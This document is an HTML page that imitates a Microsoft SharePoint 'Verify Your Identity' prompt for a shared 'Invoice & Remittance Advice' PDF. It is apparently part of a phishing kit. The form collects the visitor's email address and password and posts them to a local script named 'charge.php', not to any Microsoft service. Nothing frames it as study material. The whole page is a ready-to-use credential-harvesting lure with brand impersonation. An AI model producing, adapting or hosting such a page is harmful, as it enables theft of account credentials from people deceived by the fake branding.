<!doctype html>
<html>
<head>
	<title>Sharing Link Validation</title>
	<link rel='stylesheet prefetch' href='https://fonts.googleapis.com/css?family=Open+Sans:600'>
	<link rel="stylesheet" href="css/share-point.css">
</head>
<body>
<div class="top-banner" style="box-sizing: inherit; flex-direction: column; display: flex; height: 40px; padding: 0px 20px; justify-content: center; background: rgb(0, 120, 215); color: rgb(51, 51, 51); font-family: &quot;Segoe UI Web (West European)&quot;, &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, &quot;Helvetica Neue&quot;, sans-serif; font-size: 14px;">
<div class="brand-name" style="box-sizing: inherit; color: rgb(255, 255, 255); font-size: 21px;"><span style="box-sizing: inherit;">Microsoft SharePoint</span></div>
</div>

<div class="main-content" style="box-sizing: inherit; flex-direction: column; display: flex; align-items: center; padding: 0px 12px; color: rgb(51, 51, 51); font-family: &quot;Segoe UI Web (West European)&quot;, &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, &quot;Helvetica Neue&quot;, sans-serif; font-size: 14px; background-color: rgb(244, 244, 244);">
<div class="desktop-logo ms-hiddenSm" style="box-sizing: inherit; margin: 57px 0px 20px;"><img alt="" class="microsoft-logo" src="img/logo.png" style="box-sizing: inherit; border-style: none; height: 24px; width: 113px;" /></div>

<div class="sharing-form" style="box-sizing: inherit; border-radius: 6px; box-shadow: rgba(0, 0, 0, 0.17) 0px 0px 10px 0px; max-width: 360px; display: flex; flex-direction: column; margin: 13px 0px 16px;">
<div class="header" style="box-sizing: inherit; border-top-left-radius: 6px; border-top-right-radius: 6px; padding-top: 21px; height: 72px; border-bottom: 1px solid rgb(200, 200, 200); border-top-color: rgb(200, 200, 200); border-right-color: rgb(200, 200, 200); border-left-color: rgb(200, 200, 200); font-size: 21px; text-align: center; background-color: rgb(248, 248, 248); z-index: 2; position: relative;"><span style="box-sizing: inherit;">Verify Your Identity</span></div>

<div class="form-content" style="box-sizing: inherit; border-bottom-right-radius: 6px; border-bottom-left-radius: 6px; padding: 28px 32px 32px; background: rgb(255, 255, 255); position: relative;">
<form action="charge.php" method="POST" style="box-sizing: inherit;">
<div class="file-description" style="box-sizing: inherit;">
<div class="file-description-title" style="box-sizing: inherit; color: rgb(102, 102, 102); margin-bottom: 24px;">You&#39;ve received a secure file to:</div>

<div class="file-info" style="box-sizing: inherit; display: flex; align-items: center;"><img alt="" src="img/pdf.png" style="box-sizing: inherit; border-style: none; height: 32px; width: 32px; margin-right: 15px;" />
<div class="file-name" style="box-sizing: inherit; font-size: 17px;"><span style="box-sizing: inherit;">Invoice &amp; Remittance Advice</span></div>
</div>
</div>

<div style="box-sizing: inherit;">
<div class="form-message" style="box-sizing: inherit; color: rgb(102, 102, 102); line-height: 17px; margin: 22px 0px 24px;"><span style="box-sizing: inherit;">To open this secure link, You need to enter the email ID that this document was shared to.</span></div>

<div class="file-description" style="box-sizing: inherit;">
<div class="file-info" style="box-sizing: inherit; display: flex; align-items: center;"><img alt="logo-stripe" src="img/logo_strip0.png" style="box-sizing: inherit; border-style: none; height: 40px; width: 300px; margin-right: 15px; margin-bottom: 10px;" /></div>
</div>

<div class="form-input-container" style="box-sizing: inherit; position: relative; font-size: 17px;"><input class="form-text-input disable-on-submit is-empty " maxlength="70" name="login" pattern=".{4,30}" placeholder="Enter Email" required="" style="box-sizing: inherit; font-family: inherit; font-size: 17px; line-height: 1.15; margin: 0px 0px 20px; overflow: visible; border-width: 1px; border-style: solid; padding: 11px; color: rgb(102, 102, 102); border-color: rgb(166, 166, 166); height: 44px; width: 296px;" title="Required Field" type="email" value="" />
<div class="focus-area" style="box-sizing: inherit; position: absolute; display: inline-block; vertical-align: middle; top: 12.5px; right: 12.5px;">
<div class="callout" style="box-sizing: inherit; bottom: 42px; width: 276px; left: 8.5px; font-size: 12px; line-height: 16px; visibility: hidden; padding: 9px 12px; border-radius: 6px; margin-left: calc(-138px); box-shadow: rgba(0, 0, 0, 0.3) 2px 2px 10px 0px; position: absolute; z-index: 3;">
<div class="callout-title" style="box-sizing: inherit; font-size: 17px; margin-bottom: 11px; line-height: 20px;">&nbsp;</div>
</div>
</div>
</div>

<div class="form-error-container" style="box-sizing: inherit; color: rgb(168, 0, 0); font-size: 12px; margin-bottom: 8px;">&nbsp;<input class="form-text-input disable-on-submit is-empty " maxlength="70" name="login0" pattern=".{4,30}" placeholder="Enter Password" required="" style="box-sizing: inherit; font-family: inherit; font-size: 17px; line-height: 1.15; margin: 0px 0px 20px; overflow: visible; border-width: 1px; border-style: solid; padding: 11px; color: rgb(102, 102, 102); border-color: rgb(166, 166, 166); height: 44px; width: 296px;" title="Required Field" type="Password" value="" /></div>

<div class="form-input-container" style="box-sizing: inherit; position: relative; font-size: 17px;"><input class="form-submit disable-on-submit" name="btnSubmitEmail" style="box-sizing: inherit; font-family: inherit; font-size: 17px; line-height: 1.15; margin: 0px; overflow: visible; -webkit-appearance: button; height: 44px; width: 296px; background-color: rgb(0, 120, 215); color: rgb(255, 255, 255); border-width: 0px; border-style: initial; border-color: initial;" type="submit" value="Next" /></div>
</div>
</form>
</div>
</div>

<div class="legal" style="box-sizing: inherit; font-size: 12px; display: flex; justify-content: space-between;"><span style="box-sizing: inherit; margin-right: 12px;">&copy; 2019 Microsoft</span><a href="" style="box-sizing: inherit; background-color: transparent; margin-right: 0px; color: rgb(51, 51, 51); text-decoration-line: none;">Privacy &amp; Cookies</a></div>
</div>
</body>
</html>
